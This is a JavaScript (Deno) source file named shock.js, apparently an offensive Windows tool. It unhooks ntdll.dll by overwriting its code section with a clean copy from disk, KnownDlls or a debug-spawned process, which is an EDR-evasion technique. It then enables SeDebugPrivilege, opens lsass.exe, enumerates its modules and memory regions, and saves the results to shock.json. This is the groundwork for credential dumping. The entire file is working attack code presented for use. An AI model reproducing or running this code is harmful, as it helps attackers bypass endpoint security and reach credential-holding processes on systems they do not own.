#!/usr/bin/env -S deno run --allow-ffi --allow-write
// shock.js — Enumerate lsass modules (Deno, zero deps)
// Usage: deno run --allow-ffi --allow-write shock.js [-o disk|knowndlls|debugproc] [-p path]

// ═══════════════════════════════════════
// Constants
// ═══════════════════════════════════════
const TOKEN_ADJUST_PRIVILEGES = 0x0020;
const TOKEN_QUERY = 0x0008;
const SE_PRIVILEGE_ENABLED = 0x00000002;
const PROCESS_VM_OPERATION = 0x8;
const PROCESS_VM_WRITE = 0x20;
const PAGE_NOACCESS = 0x01;
const MEM_COMMIT = 0x00001000;
const MAXIMUM_ALLOWED = 0x02000000;
const GENERIC_READ = 0x80000000;
const FILE_SHARE_READ = 0x00000001;
const FILE_ATTRIBUTE_NORMAL = 0x00000080;
const OPEN_EXISTING = 3;
const PAGE_READONLY = 0x02;
const SEC_IMAGE_NO_EXECUTE = 0x11000000;
const FILE_MAP_READ = 4;
const SECTION_MAP_READ = 0x0004;
const PAGE_EXECUTE_WRITECOPY = 0x80;
const DEBUG_PROCESS = 0x00000001;
const OFFSET_MAPPEDDLL = 4096;

const SZ_PBI = 48;
const SZ_MBI = 48;
const SZ_OA = 48;
const SZ_CID = 16;
const SZ_TP = 16;
const SZ_SI = 104;
const SZ_PI = 24;

// ══════════════════════════════
// FFI — ntdll.dll
// ══════════════════════════════
const ntdll = Deno.dlopen("ntdll.dll", {
  NtOpenProcessToken: { parameters: ["pointer", "u32", "buffer"], result: "u32" },
  NtAdjustPrivilegesToken: { parameters: ["pointer", "u32", "buffer", "u32", "pointer", "pointer"], result: "u32" },
  NtOpenProcess: { parameters: ["buffer", "u32", "buffer", "buffer"], result: "i32" },
  NtClose: { parameters: ["pointer"], result: "u32" },
  NtGetNextProcess: { parameters: ["pointer", "u32", "u32", "u32", "buffer"], result: "u32" },
  NtQueryInformationProcess: { parameters: ["pointer", "u32", "buffer", "u32", "buffer"], result: "i32" },
  NtReadVirtualMemory: { parameters: ["pointer", "pointer", "buffer", "u32", "buffer"], result: "i32" },
  NtQueryVirtualMemory: { parameters: ["pointer", "pointer", "u32", "buffer", "u32", "buffer"], result: "u32" },
  NtOpenSection: { parameters: ["buffer", "u32", "buffer"], result: "i32" },
  RtlMoveMemory: { parameters: ["pointer", "pointer", "usize"], result: "void" },
});

// ═══════════════════════════════════════
// FFI — kernel32.dll
// ═══════════════════════════════════════
const kernel32 = Deno.dlopen("kernel32.dll", {
  GetCurrentProcess: { parameters: [], result: "pointer" },
  CreateFileA: { parameters: ["buffer", "u32", "u32", "pointer", "u32", "u32", "pointer"], result: "pointer" },
  CreateFileMappingA: { parameters: ["pointer", "pointer", "u32", "u32", "u32", "pointer"], result: "pointer" },
  MapViewOfFile: { parameters: ["pointer", "u32", "u32", "u32", "usize"], result: "pointer" },
  VirtualProtect: { parameters: ["pointer", "u32", "u32", "buffer"], result: "i32" },
  CloseHandle: { parameters: ["pointer"], result: "i32" },
  CreateProcessW: { parameters: ["buffer", "pointer", "pointer", "pointer", "i32", "u32", "pointer", "pointer", "buffer", "buffer"], result: "i32" },
  DebugActiveProcessStop: { parameters: ["u32"], result: "i32" },
  TerminateProcess: { parameters: ["pointer", "u32"], result: "i32" },
});

// ═══════════════════════════════════════
// Buffer / pointer helpers
// ═══════════════════════════════════════
function getU32(buf, off = 0) { return new DataView(buf.buffer, buf.byteOffset).getUint32(off, true); }
function getU64(buf, off = 0) { return new DataView(buf.buffer, buf.byteOffset).getBigUint64(off, true); }
function putU16(buf, off, val) { new DataView(buf.buffer, buf.byteOffset).setUint16(off, val, true); }
function putU32(buf, off, val) { new DataView(buf.buffer, buf.byteOffset).setUint32(off, val, true); }
function putU64(buf, off, val) { new DataView(buf.buffer, buf.byteOffset).setBigUint64(off, val, true); }
function toPtr(v) { const b = BigInt(v); return b === 0n ? null : Deno.UnsafePointer.create(b); }
function ptrOf(buf, off = 0) { const v = getU64(buf, off); return v === 0n ? null : Deno.UnsafePointer.create(v); }
function ptrVal(ptr) { if (ptr === null) return 0n; if (typeof ptr === "bigint") return ptr; return Deno.UnsafePointer.value(ptr); }
function encodeAnsi(str) { const buf = new Uint8Array(str.length + 1); for (let i = 0; i < str.length; i++) buf[i] = str.charCodeAt(i); return buf; }
function encodeWide(str) { const buf = new Uint8Array((str.length + 1) * 2); for (let i = 0; i < str.length; i++) { buf[i * 2] = str.charCodeAt(i) & 0xff; buf[i * 2 + 1] = (str.charCodeAt(i) >> 8) & 0xff; } return buf; }

// ══════════════════════════════
// NT API wrappers
// ══════════════════════════════
function readRemoteIntPtr(hProc, addr) {
  const buf = new Uint8Array(8);
  const br = new Uint8Array(8);
  const st = ntdll.symbols.NtReadVirtualMemory(hProc, toPtr(addr), buf, 8, br);
  if (st !== 0) return null;
  return getU64(buf);
}

function readRemoteN(hProc, addr, n) {
  const buf = new Uint8Array(n);
  const br = new Uint8Array(8);
  const st = ntdll.symbols.NtReadVirtualMemory(hProc, toPtr(addr), buf, n, br);
  if (st !== 0) return null;
  if (n === 8) return getU64(buf);
  if (n === 4) return BigInt(getU32(buf));
  if (n === 2) return BigInt(new DataView(buf.buffer).getUint16(0, true));
  return BigInt(buf[0]);
}

function readRemoteWStr(hProc, addr) {
  const buf = new Uint8Array(256);
  const br = new Uint8Array(8);
  const st = ntdll.symbols.NtReadVirtualMemory(hProc, toPtr(addr), buf, 256, br);
  if (st !== 0) return "";
  const cnt = getU32(br);
  let end = cnt;
  for (let i = 0; i < cnt - 1; i += 2) { if (buf[i] === 0 && buf[i + 1] === 0) { end = i; break; } }
  return new TextDecoder("utf-16le").decode(buf.subarray(0, end));
}

// ═══════════════════════════════════════
// Process helpers
// ═══════════════════════════════════════
function getProcNameFromHandle(hProc) {
  const pbi = new Uint8Array(SZ_PBI);
  const rl = new Uint8Array(4);
  const st = ntdll.symbols.NtQueryInformationProcess(hProc, 0, pbi, SZ_PBI, rl);
  if (st !== 0) throw new Error("NtQueryInformationProcess: 0x" + (st >>> 0).toString(16));
  const peb = getU64(pbi, 8);
  const ppAddr = readRemoteIntPtr(hProc, peb + 0x20n);
  if (ppAddr === null) return "";
  const imgAddr = readRemoteIntPtr(hProc, ppAddr + 0x68n);
  if (imgAddr === null) return "";
  return readRemoteWStr(hProc, imgAddr);
}

function getProcessByName(name) {
  const hBuf = new Uint8Array(8);
  while (true) {
    const cur = ptrOf(hBuf);
    const st = ntdll.symbols.NtGetNextProcess(cur, MAXIMUM_ALLOWED, 0, 0, hBuf);
    if (st !== 0) break;
    try {
      const h = ptrOf(hBuf);
      const n = getProcNameFromHandle(h);
      if (n.toLowerCase() === name.toLowerCase()) return h;
    } catch { /* skip */ }
  }
  return null;
}

function openProcess(pid) {
  const hBuf = new Uint8Array(8);
  const oa = new Uint8Array(SZ_OA); putU32(oa, 0, SZ_OA);
  const cid = new Uint8Array(SZ_CID); putU64(cid, 0, BigInt(pid));
  const st = ntdll.symbols.NtOpenProcess(hBuf, PROCESS_VM_OPERATION | PROCESS_VM_WRITE, oa, cid);
  if (st !== 0) { console.log("[-] NtOpenProcess failed. Are you admin?"); Deno.exit(1); }
  return ptrOf(hBuf);
}

function enableDebugPrivilege() {
  const curProc = openProcess(Deno.pid);
  const tokBuf = new Uint8Array(8);
  let st = ntdll.symbols.NtOpenProcessToken(curProc, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, tokBuf);
  if (st !== 0) { console.log("[-] NtOpenProcessToken: 0x" + (st >>> 0).toString(16)); Deno.exit(1); }
  const tok = ptrOf(tokBuf);
  const tp = new Uint8Array(SZ_TP);
  putU32(tp, 0, 1); putU32(tp, 4, 20); putU32(tp, 8, 0); putU32(tp, 12, SE_PRIVILEGE_ENABLED);
  st = ntdll.symbols.NtAdjustPrivilegesToken(tok, 0, tp, SZ_TP, null, null);
  ntdll.symbols.NtClose(tok);
  if (st !== 0) { console.log("[-] NtAdjustPrivilegesToken: 0x" + (st >>> 0).toString(16)); Deno.exit(1); }
  console.log("[+] SeDebugPrivilege enabled successfully.");
}

// ═══════════════════════════════════════
// Overwrite functions
// ═══════════════════════════════════════
function getLocalLibAddress(dllName) {
  const hProc = kernel32.symbols.GetCurrentProcess();
  const pbi = new Uint8Array(SZ_PBI);
  const rl = new Uint8Array(4);
  ntdll.symbols.NtQueryInformationProcess(hProc, 0, pbi, SZ_PBI, rl);
  const peb = getU64(pbi, 8);
  const ldrAddr = readRemoteN(hProc, peb + 0x18n, 8);
  let nextFlink = readRemoteN(hProc, ldrAddr + 0x30n, 8);
  let dllBase = 1337n;
  while (dllBase !== 0n) {
    nextFlink -= 0x10n;
    dllBase = readRemoteN(hProc, nextFlink + 0x20n, 8);
    if (dllBase === null || dllBase === 0n) break;
    const bufPtr = readRemoteN(hProc, nextFlink + 0x50n, 8);
    const baseName = bufPtr !== null ? readRemoteWStr(hProc, bufPtr) : "";
    if (baseName === dllName) return dllBase;
    nextFlink = readRemoteN(hProc, nextFlink + 0x10n, 8);
  }
  return null;
}

function getSectionInfo(localNtdll) {
  const hProc = kernel32.symbols.GetCurrentProcess();
  const eLfanew = readRemoteN(hProc, localNtdll + 0x3Cn, 4);
  const sizeOfCode = readRemoteN(hProc, localNtdll + eLfanew + 28n, 4);
  const baseOfCode = readRemoteN(hProc, localNtdll + eLfanew + 44n, 4);
  return [baseOfCode, sizeOfCode];
}

function replaceNtdllSection(srcPtr, targetAddr, size) {
  const oldProt = new Uint8Array(4);
  kernel32.symbols.VirtualProtect(toPtr(targetAddr), Number(size), PAGE_EXECUTE_WRITECOPY, oldProt);
  ntdll.symbols.RtlMoveMemory(toPtr(targetAddr), srcPtr, Number(size));
  const prev = getU32(oldProt);
  kernel32.symbols.VirtualProtect(toPtr(targetAddr), Number(size), prev, oldProt);
}

function overwriteDisk(path) {
  const fh = kernel32.symbols.CreateFileA(encodeAnsi(path), GENERIC_READ, FILE_SHARE_READ, null, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, null);
  const mh = kernel32.symbols.CreateFileMappingA(fh, null, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, null);
  const unhookedNtdll = kernel32.symbols.MapViewOfFile(mh, FILE_MAP_READ, 0, 0, 0);
  kernel32.symbols.CloseHandle(fh); kernel32.symbols.CloseHandle(mh);
  const unhookedText = ptrVal(unhookedNtdll) + BigInt(OFFSET_MAPPEDDLL);
  const localNtdll = getLocalLibAddress("ntdll.dll");
  const [baseOfCode, sizeOfCode] = getSectionInfo(localNtdll);
  const localTxt = localNtdll + baseOfCode;
  console.log("[+] Copying " + sizeOfCode + " bytes from 0x" + unhookedText.toString(16) + " to 0x" + localTxt.toString(16));
  replaceNtdllSection(toPtr(unhookedText), localTxt, sizeOfCode);
}

function overwriteKnownDlls() {
  const sectionName = "\\KnownDlls\\ntdll.dll";
  const wideStr = encodeWide(sectionName);
  const us = new Uint8Array(16);
  putU16(us, 0, sectionName.length * 2); putU16(us, 2, sectionName.length * 2 + 2);
  putU64(us, 8, ptrVal(Deno.UnsafePointer.of(wideStr)));
  const oa = new Uint8Array(SZ_OA); putU32(oa, 0, SZ_OA);
  putU64(oa, 16, ptrVal(Deno.UnsafePointer.of(us)));
  const shBuf = new Uint8Array(8);
  const st = ntdll.symbols.NtOpenSection(shBuf, SECTION_MAP_READ, oa);
  if (st !== 0) { console.log("[-] NtOpenSection: " + st); return; }
  const unhookedNtdll = kernel32.symbols.MapViewOfFile(ptrOf(shBuf), SECTION_MAP_READ, 0, 0, 0);
  kernel32.symbols.CloseHandle(ptrOf(shBuf));
  const unhookedText = ptrVal(unhookedNtdll) + BigInt(OFFSET_MAPPEDDLL);
  const localNtdll = getLocalLibAddress("ntdll.dll");
  const [baseOfCode, sizeOfCode] = getSectionInfo(localNtdll);
  const localTxt = localNtdll + baseOfCode;
  console.log("[+] Copying " + sizeOfCode + " bytes from 0x" + unhookedText.toString(16) + " to 0x" + localTxt.toString(16));
  replaceNtdllSection(toPtr(unhookedText), localTxt, sizeOfCode);
}

function overwriteDebugProc(path) {
  const si = new Uint8Array(SZ_SI); putU32(si, 0, SZ_SI);
  const pi = new Uint8Array(SZ_PI);
  const ok = kernel32.symbols.CreateProcessW(encodeWide(path), null, null, null, 0, DEBUG_PROCESS, null, null, si, pi);
  if (!ok) { console.log("[-] CreateProcessW failed"); return; }
  const hProcess = ptrOf(pi, 0); const dwPid = getU32(pi, 16);
  const localNtdll = getLocalLibAddress("ntdll.dll");
  const [baseOfCode, sizeOfCode] = getSectionInfo(localNtdll);
  const localTxt = localNtdll + baseOfCode;
  const buf = new Uint8Array(Number(sizeOfCode)); const br = new Uint8Array(8);
  ntdll.symbols.NtReadVirtualMemory(hProcess, toPtr(localTxt), buf, Number(sizeOfCode), br);
  kernel32.symbols.DebugActiveProcessStop(dwPid);
  kernel32.symbols.TerminateProcess(hProcess, 0);
  console.log("[+] Copying " + sizeOfCode + " bytes to 0x" + localTxt.toString(16));
  replaceNtdllSection(Deno.UnsafePointer.of(buf), localTxt, sizeOfCode);
}

// ══════════════════════════════
// Shock: query process information
// ══════════════════════════════
function queryProcessInformation(hProc) {
  const pbi = new Uint8Array(SZ_PBI);
  const rl = new Uint8Array(4);
  const st = ntdll.symbols.NtQueryInformationProcess(hProc, 0, pbi, SZ_PBI, rl);
  if (st !== 0) throw new Error("NtQueryInformationProcess: 0x" + (st >>> 0).toString(16));
  const peb = getU64(pbi, 8);
  console.log("[+] PEB Base Address: 0x" + peb.toString(16));
  const ldrAddr = readRemoteIntPtr(hProc, peb + 0x18n);
  let nextFlink = readRemoteIntPtr(hProc, ldrAddr + 0x30n);
  const mods = [];
  let dllBase = 1337n;
  while (dllBase !== 0n) {
    nextFlink -= 0x10n;
    dllBase = readRemoteIntPtr(hProc, nextFlink + 0x20n);
    if (dllBase === null || dllBase === 0n) break;
    const bufPtr = readRemoteIntPtr(hProc, nextFlink + 0x50n);
    const baseName = bufPtr !== null ? readRemoteWStr(hProc, bufPtr) : "";
    const fullPtr = readRemoteIntPtr(hProc, nextFlink + 0x40n);
    const fullPath = fullPtr !== null ? readRemoteWStr(hProc, fullPtr) : "";
    mods.push({ field0: baseName, field1: fullPath, field2: "0x" + dllBase.toString(16), field3: 0 });
    nextFlink = readRemoteIntPtr(hProc, nextFlink + 0x10n);
  }
  return mods;
}

function shock(hProc) {
  const mods = queryProcessInformation(hProc);
  let memAddr = 0n;
  const maxAddr = 0x7FFFFFFeFFFFn;
  let auxSize = 0n, auxName = "";
  while (memAddr < maxAddr) {
    const mbi = new Uint8Array(SZ_MBI);
    const rl = new Uint8Array(8);
    ntdll.symbols.NtQueryVirtualMemory(hProc, toPtr(memAddr), 0, mbi, SZ_MBI, rl);
    const protect = getU32(mbi, 36), state = getU32(mbi, 32);
    const regionSize = getU64(mbi, 24), baseAddr = getU64(mbi, 0);
    if (protect !== PAGE_NOACCESS && state === MEM_COMMIT) {
      const cur = mods.find((o) => o.field0 === auxName) || { field2: "0" };
      if (regionSize === 0x1000n && baseAddr !== BigInt(cur.field2)) {
        const idx = mods.findIndex((o) => o.field0 === auxName);
        if (idx !== -1) mods[idx].field3 = Number(auxSize);
        for (const m of mods) {
          if (baseAddr === BigInt(m.field2)) { auxName = m.field0; auxSize = regionSize; break; }
        }
      } else {
        auxSize += regionSize;
      }
    }
    memAddr += regionSize > 0n ? regionSize : 0x1000n;
  }
  return mods;
}

// ══════════════════════════════
// CLI args
// ══════════════════════════════
function parseArgs() {
  const args = { option: null, path: null };
  for (let i = 0; i < Deno.args.length; i++) {
    if (Deno.args[i] === "-o" || Deno.args[i] === "--option") args.option = Deno.args[++i];
    else if (Deno.args[i] === "-p" || Deno.args[i] === "--path") args.path = Deno.args[++i];
  }
  return args;
}

// ══════════════════════════════
// Main
// ══════════════════════════════
function main() {
  const args = parseArgs();

  if (args.option === "disk") {
    overwriteDisk(args.path || "C:\\Windows\\System32\\ntdll.dll");
  } else if (args.option === "knowndlls") {
    overwriteKnownDlls();
  } else if (args.option === "debugproc") {
    overwriteDebugProc(args.path || "c:\\windows\\system32\\calc.exe");
  }

  enableDebugPrivilege();

  const processName = "c:\\windows\\system32\\lsass.exe";
  const hProc = getProcessByName(processName);
  console.log("[+] Process handle: " + (hProc ? "obtained" : "null"));
  if (hProc === null) { console.log("[-] Could not get process handle"); Deno.exit(1); }

  const shockData = shock(hProc);
  ntdll.symbols.NtClose(hProc);

  Deno.writeTextFileSync("shock.json", JSON.stringify(shockData));
  console.log("[+] File shock.json generated.");
}

main();
